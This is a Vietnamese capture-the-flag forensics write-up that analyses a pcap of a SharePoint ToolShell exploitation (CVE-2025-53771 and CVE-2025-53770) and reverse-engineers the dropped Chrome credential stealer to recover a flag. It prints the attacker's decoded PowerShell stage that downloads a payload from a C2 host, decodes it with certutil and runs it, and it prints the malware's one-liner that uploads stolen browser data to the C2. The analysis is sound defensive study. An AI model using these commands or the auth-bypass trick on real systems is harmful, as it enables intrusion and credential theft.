**Gimme Your Point** là một challenge trong CTF Blue của VCS Passport 2025

![image](https://hackmd.io/_uploads/ByF3YlpQbe.png)

đề cung cấp cho chúng ta một file .pcap

![image](https://hackmd.io/_uploads/ByAG9l67bg.png)

Oker mở lên xem nào

![image](https://hackmd.io/_uploads/SyX5wWTQbg.png)

Ta thấy client đang request GET đến `30.243.67.129/_layouts/15/start.aspx` 
và ta thấy được response là **SharePoint Start Page** mặc định. Ở stream này, ta chưa thấy có gì độc hại ở đây, có vẻ author muốn cho chúng ta context.

# RCE (CVE-2025-53771, CVE-2025-53770)
---
![image](https://hackmd.io/_uploads/Hks2gMpQZg.png)

đến với stream tiếp theo thì request này KHÔNG phải request bình thường, mà là một bước trong chuỗi khai thác **ToolShell**:

**CVE-2025-53771** (auth bypass)
➜ **CVE-2025-53770** (unsafe deserialization → RCE)

Mình sẽ cung cấp 2 blog nói về 2 con CVE này ở đây:

https://www.wiz.io/blog/sharepoint-vulnerabilities-cve-2025-53770-cve-2025-53771-everything-you-need-to-k

https://blog.viettelcybersecurity.com/toolshell-chuoi-lo-hong-sharepoint-nghiem-trong-dang-bi-khai-thac-trong-thuc-te/

Tóm tắt thì:

CVE-2025-53771 kỹ thuật bypass xác thực, cho phép truy cập `ToolPane.aspx` không cần đăng nhập.

**Cách khai thác**
SharePoint đã chặn truy cập trực tiếp:
`/_layouts/15/ToolPane.aspx`
Tuy nhiên, nếu attacker thêm path phía sau .aspx, ví dụ:
`/_layouts/15/ToolPane.aspx/anything`
SharePoint **vẫn xử lý request như ToolPane.aspx**.
Khi kết hợp với header:
`Referer: /_layouts/SignOut.aspx`
logic kiểm tra xác thực bị đánh lừa.

**Kết quả**
* Bypass thành công cơ chế bảo vệ
* Truy cập ToolPane.aspx ở chế độ ẩn danh
* Mở đường cho các bước khai thác tiếp theo (inject WebPart / deserialization / RCE)


![image](https://hackmd.io/_uploads/r1BkDfTQbg.png)

Từ đó chúng ta thấy rõ ràng sự việc khai thác CVE luôn

Tiếp theo là về **CVE-2025-53770**:

Body request của attacker trong như sau:
![image](https://hackmd.io/_uploads/B1TdDfpXWx.png)

Mình đã decode để dễ đọc hơn:

![image](https://hackmd.io/_uploads/ryifdM6QWg.png)
* MSOTlPn_Uri
→ Tham số hợp lệ của ToolPane, dùng để đánh lừa SharePoint rằng request là một WebPart hợp pháp.

* MSOTlPn_DWP
→ Payload khai thác chính. SharePoint render trực tiếp nội dung này mà không xác thực.

* Bên trong MSOTlPn_DWP, attacker:
    * Đăng ký ASP.NET control nguy hiểm
    *    Nhúng dữ liệu nén + serialized (CompressedDataTable)
    * Khi xử lý, SharePoint giải nén + deserialize, dẫn tới thực thi mã

**Kết quả**
* Remote Code Execution

decode đoạn base64 -> gunzip (*do cơ chế lưu trữ đặc thù của thư viện PerformancePoint Services trong SharePoint*) trong thẻ CompressedDataTable ta được

![image](https://hackmd.io/_uploads/rknQf7pmZg.png)

Việc mã độc nằm trong thẻ <anyType> (với kiểu xsd:string) là một thủ thuật kỹ thuật nhằm mục đích:

* Làm tham số cho "ngòi nổ": Hacker đang gọi hàm Deserialize của lớp LosFormatter. Hàm này bắt buộc cần một tham số đầu vào. Thẻ <anyType> đóng vai trò là "vùng chứa" để truyền tham số đó vào.

* Khai báo kiểu dữ liệu vạn năng: Thẻ <anyType> cực kỳ linh hoạt trong XML. Nó cho phép hacker nhét một chuỗi Base64 cực dài (thực chất là đối tượng nhị phân) mà không làm máy chủ nghi ngờ hoặc gây lỗi định dạng khi phân tích cú pháp XML.

* Tạo cuộc tấn công lồng nhau (Nested Attack): Máy chủ tưởng rằng nó chỉ đang đọc một chuỗi văn bản (string), nhưng khi hàm Deserialize xử lý chuỗi đó, nó lại biến thành một lệnh thực thi hệ thống (PowerShell).
    
tiếp tục decode đoạn base64 trong thẻ <anyType> này ta được:
![image](https://hackmd.io/_uploads/SkO8QX6mbx.png)
ở đây ta thấy có các lệnh hệ thống, sẽ được viết lại thành:
```
# 1. Tải tệp tin chứa mã độc từ máy chủ C2 của hacker
Invoke-WebRequest -Uri http://30.243.67.128:1234/raw_package -OutFile C:\Windows\Temp\raw_package; 

# 2. Chèn thêm các đoạn mã Base64 vào tệp để tạo cấu trúc Certutil hợp lệ
Add-Content -Path C:\Windows\Temp\raw_package -Value bGVYQjFibU4wU1dOTVlqRkZSVVVBDQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0t -Encoding UTF8; 
Add-Content -Path C:\Windows\Temp\raw_package -Value DQo= -Encoding UTF8; 
Add-Content -Path C:\Windows\Temp\raw_package -Value '-----END CERTIFICATE-----' -Encoding UTF8; 

# 3. Sử dụng công cụ hệ thống certutil để giải mã tệp (vượt qua AV)
certutil -decode C:\Windows\Temp\raw_package C:\Windows\Temp\d1; 
certutil -decode C:\Windows\Temp\d1 C:\Windows\Temp\health_check.exe; 

# 4. Xóa các tệp tạm để xóa dấu vết
del C:\Windows\Temp\raw_package; 
del C:\Windows\Temp\d1; 

# 5. Kích hoạt mã độc và xóa file sau khi chạy
C:\Windows\Temp\health_check.exe; 
sleep 10; 
del C:\Windows\Temp\health_check.exe
```

oke đến đây chúng ta đã biết và hiểu được quá trình mà attacker bypass auth (CVE-2025-53771), khai thác lỗ hỏng (CVE-2025-53770), RCE và tải về một con malware. Tiếp theo, chúng ta cố gắng tái tạo và phân tích con malware này.

---
    
# Phân tích malware health_check.exe:

tiếp đến stream 2:
![image](https://hackmd.io/_uploads/HkPgI76Xbx.png)

ta thấy nó đang tải file `raw_package` từ host `30.243.67.128:1234`, Đây chính là C2 của attacker, mà chúng ta đã phân tích phân tích đoạn RCE ở trên. Như đã biết, đây là đoạn binary đã được ngụy trang qua `2 lớp base64` để tạo thành malware được lưu dưới tên `health_check.exe`.

    
Do base64 này được lưu và format dưới dạng cert, nên nó bị add phần BEGIN, END CERT nên việc decode chay bằng cyberchef thì phải xóa các byte rác và format, nên hay vì vậy chúng chạy thẳng các lệnh RCE đã decode và giải nén ở bước trước luôn:)))), lười.
![image](https://hackmd.io/_uploads/Bkk8jma7Zx.png)

kiểm tra lại:
![image](https://hackmd.io/_uploads/HyMQh7T7Ze.png)
![image](https://hackmd.io/_uploads/ByiynsJN-e.png)

Ta thấy đây là file 64-bit executable, biên dịch bằng MinGW-w64 GCC (Vậy là được viết bằng C/C++) và không bị packed.    
    
oker có vẻ ổn rồi, giờ load vào ida để phân tích thoiii

**Tóm tắt thì: Malware này thu thập dữ liệu Chrome (Login Data + Local State) -> copy sang thư mục tạm -> nén + đặt password -> upload ZIP lên C2 bằng PowerShell.**

Bắt đầu ở hàm main() nào:
![image](https://hackmd.io/_uploads/rJQHAiJN-e.png)

Ở đây chúng ta thấy rõ ràng hành vi thu thập dữ liệu, cụ thể là nó sẽ xác định các path `%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data` và `%localappdata%\\Google\\Chrome\\User Data\\Local State` -> resolve các path này -> tạo thư mục temp đặt tên theo GUID, còn các files `chrome_health_result`, `chrome_service_result` sẽ copy raw từ `Login Data`, `Local State`
> CopyFileW(Login Data -> chrome_health_result)
> CopyFileW(Local State -> chrome_service_result)

![image](https://hackmd.io/_uploads/Byh_-3JVbg.png)

Tiếp theo nó sẽ nén folder chứa các dữ liệu đã đánh cắp, được đặt tên là GUID thành file .zip + đặt bằng khẩu thông qua `GenPass3`

![image](https://hackmd.io/_uploads/SJpfz2JNZe.png)

Sau đó nó thực hiện exfiltrate file .zip đó đến C2 `30.243.67.128:8000` bằng powershell
```
powershell.exe "Add-Type -AssemblyName 'System.Net.Http'; $file = Get-Item '{ZIP_PATH}'; $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = $file.OpenRead(); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, 'file', $file.Name); $response = $client.PostAsync('http://30.243.67.128:8000/upload', $content).Result; $fileStream.Close(); $client.Dispose()"
``` 

Bên cạnh đó chúng ta hãy tìm hiểu cách mà con malware này GenPass cho file .zip này

**GenPass3**:
![image](https://hackmd.io/_uploads/HyYqNnk4We.png)

ta có thể thấy là nó đang gọi GenPass2, sau khi gọi thành công thì nó append "s" vào. Tiếp tục xem GenPass2.

**GenPass2**
![image](https://hackmd.io/_uploads/Bk9brhJ4-l.png)
nó lại tiếp tục gọi GenPass1, sau đó thì nó append "_" vào

**GenPass1** 
![image](https://hackmd.io/_uploads/ByrVH2kE-l.png)

thì ta đã đến được nơi khởi tạo chuỗi gốc.
Tóm lại thì đây là `call flow` của genpass này:

GenPass3
L___GenPass2
L______GenPass1

=> password sẽ là: _p4$$w0d_s (Nhưng đây chưa phải là pass thật)

Quay lại file pcap một tí

![image](https://hackmd.io/_uploads/B1qJP2JE-l.png)

thì ở stream 3, ta thấy có một file zip đã được gửi đến `30.243.67.128:8000`, thì dựa vào những phân tích vừa rồi, chúng ta có thể khẳng định ngay đây chính là file zip chứa các thông tin như `Login Data`, `Local State` đã bị malware đánh cắp và đang gửi đến C2. Export nó ra thôi.

![image](https://hackmd.io/_uploads/rJW7KnkE-g.png)


Đúng như dự đoán là nó chứa 2 file bị đánh cắp (đã được đổi tên) và chắc chắn khi giải nén thì nó sẽ yêu cầu password, lấy password mà ta vừa phân tích được ở trên (_p4$$w0d_s) là được.

**BÙMMMMMMMMMMMMMMMMMMMMMMMMMM**
![image](https://hackmd.io/_uploads/BkL4Y2yEbx.png)

**Incorrect password**

hơ hơ, sai pass rồi, cayyyyy.

Sau một hồi kiểm tra, toi lục đến section `.rdata` (read-only data) để xem các chuỗi password được lưu như thế nào. Thì ối giời oi, còn những chuỗi khác mà tôi đã bỏ sót

![image](https://hackmd.io/_uploads/Sy6wc3yEWe.png)

Nhưng kì lạ ở chỗ, toi xem cross-reference list của các chuỗi này
thì chỉ có 's','_','_p4$$w0d' là được gọi

![image](https://hackmd.io/_uploads/rypNohy4bx.png)

nên chúng ta đã nhằm tưởng _p4$$w0d_s là password đúng, nhưng không phải

![image](https://hackmd.io/_uploads/rkn822y4bx.png)


còn các chuỗi như 'up3r', 'S3(ReT',... thì không thấy được gọi, sử dụng ở bất kỳ đâu trong chương trình.
![image](https://hackmd.io/_uploads/rkZZ23k4We.png)
![image](https://hackmd.io/_uploads/rkyKnhkVbg.png)

thì ở đây chúng ta có thể craft mật khẩu thủ công, ngồi mò mò, dò dò nào đúng thì được file:))))

Nhưng còn một cách khác, chúng ta có thể **debug**.

Quay lại hàm `CompressFolder()` nơi mà lệnh để zip file được thực thi, thì chúng ta đã biết, khi nén bằng commandline thì với 7zip, sẽ dùng -p  <password> để đặt mật khẩu cho file zip đó, vậy khi chúng ta đặt breakpoint tại điểm mà tạo ra tiến trình nén file, ta có thể thấy được hoàn chỉnh câu lệnh do malware thực thi để nén file.

Dựa vào ý tưởng đó toi đã đặt breakpoint tại:
![image](https://hackmd.io/_uploads/SJOkkT1EZl.png)

trong trường hợp này v4 là con trỏ LPWSTR trỏ tới commandline string (powershell one-liner)

![image](https://hackmd.io/_uploads/r1q-bayEZg.png)

cụ thể hơn, khi này thanh `rax` sẽ giữ toàn bộ commandline, oke start và lấy pass thôi.

![image](https://hackmd.io/_uploads/HJbbMa1EZx.png)
oke bingo

ở đây chúng ta có thể export ra hex string, rồi xóa bỏ các byte rác và format lại để lấy 1 chuỗi command hoàn chỉnh
![image](https://hackmd.io/_uploads/BkoLzpkEbg.png)

hoặc quăng cho chatbot kêu nó format lại cho lẹ:)))))))))))

đây là toàn bộ câu lệnh đó:
`"C:\Program Files\VMware\VMware Tools\7za.exe" a "C:\Windows\Temp\{CC70F63E-CFD4-4C58-B9D4-EEA602E19294}.zip" "C:\Windows\Temp\{CC70F63E-CFD4-4C58-B9D4-EEA602E19294}\*" -p sup3r_S3(ReT_p4$$w0d`

và password hoành chỉnh là **`sup3r_S3(ReT_p4$$w0d`**

với pass này thì chúng ta đã giải nén thành công file zip

![image](https://hackmd.io/_uploads/Bk637ak4Wl.png)

kiểm tra nó là file gì
![image](https://hackmd.io/_uploads/B1KxEakEbg.png)

vì file `chrome_health_result` là `Login Data`, khá thú vị nên toi bắt đầu từ nó.
    
Mở nó bằng DB Browser (vì nó là file database)

![image](https://hackmd.io/_uploads/rkaO4pyVbx.png)

oker đây rồi, ở record `logins` thì ta thấy được giá của cột `username_value` là `SH4R3_y0R_P$$wD`

craft với prefix là VCS{} thì ta được flag `VCS{SH4R3_y0R_P$$wD}`

Ngoài 1 số hàm của malware mà toi phân tích ở trên, vẫn còn một số hàm khác như
![image](https://hackmd.io/_uploads/SyR1U6k4We.png)

dùng để check xem có đang debug trong máy ảo hay không, cũng như là lấy path của 7zip cho phục việc nén file. Nếu debug ở máy thật chúng ta phải có thêm các bước đặt breakpoint để nhảy qua phần kiểm tra vm đó.

**Cảm ơn mọi người đã đọc đến đây, chúc một ngày tốt lành**

(\\_/)
(•.•)
(>☕
---- SawG, a.k.a EagleBoiz
